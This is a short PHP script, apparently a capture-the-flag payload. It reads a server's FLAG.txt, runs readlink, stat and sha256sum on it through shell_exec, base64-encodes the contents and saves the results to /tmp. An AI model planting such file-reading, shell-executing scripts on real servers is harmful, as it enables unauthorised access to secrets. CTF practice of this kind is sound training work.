<?php
// Flag 파일 회수
$flag_file = '/var/www/FLAG.txt';
$flag_content = @file_get_contents($flag_file);

if ($flag_content === false) {
    die("Failed to read flag file");
}

// 정보 수집
$readlink = @shell_exec("readlink -f $flag_file");
$stat = @shell_exec("stat $flag_file");
$sha256 = @shell_exec("sha256sum $flag_file");
$base64 = base64_encode($flag_content);

// 결과를 파일에 저장
file_put_contents('/tmp/flag_result.txt', "=== READLINK ===\n$readlink\n\n=== STAT ===\n$stat\n\n=== SHA256 ===\n$sha256\n\n=== BASE64 ===\n$base64\n\n=== CONTENT ===\n$flag_content\n");

echo "SUCCESS";
?>
